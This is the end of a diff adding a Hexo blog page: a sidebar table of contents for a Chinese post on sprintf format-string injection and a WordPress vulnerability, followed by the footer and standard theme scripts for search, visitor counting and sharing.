+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/pangya/" title="胖丫丶" target="_blank">胖丫丶</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#深入解析sprintf格式化字符串漏洞"><span class="nav-number">1.</span> <span class="nav-text">深入解析sprintf格式化字符串漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-sprintf-讲解"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 sprintf()讲解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#首先我们先了解sprintf-函数"><span class="nav-number">1.1.1.</span> <span class="nav-text">首先我们先了解sprintf()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过几个例子回顾一下sprintf"><span class="nav-number">1.1.2.</span> <span class="nav-text">通过几个例子回顾一下sprintf</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-sprintf注入原理"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 sprintf注入原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#这里我们举两个例子"><span class="nav-number">1.2.1.</span> <span class="nav-text">这里我们举两个例子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NO-1"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">NO.1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NO-2"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">NO.2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NO-3"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">NO.3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">1.2.2.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-题目训练"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 题目训练</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一道注入题目"><span class="nav-number">1.3.1.</span> <span class="nav-text">一道注入题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#中心思想"><span class="nav-number">1.3.2.</span> <span class="nav-text">中心思想</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#涉及到的一些知识点："><span class="nav-number">1.3.3.</span> <span class="nav-text">涉及到的一些知识点：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码"><span class="nav-number">1.3.4.</span> <span class="nav-text">代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Wordpress格式化字符串漏洞"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 Wordpress格式化字符串漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞跟踪"><span class="nav-number">1.4.1.</span> <span class="nav-text">漏洞跟踪</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.4.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞修补"><span class="nav-number">1.4.3.</span> <span class="nav-text">漏洞修补</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">KKABqN</span>
+
+  
+</div>
+
+<p>My way of tramp journey is from the galaxy's firmament to the starry ocean.</p>    <!--文字-->
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("3zIUNafVjzYQz7AJMe457cT0-gzGzoHsz", "PzPKmCfoYOpSgHcoyql6etIG");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "box";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "box";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: 12981,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+  
+
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+</body>
+</html>
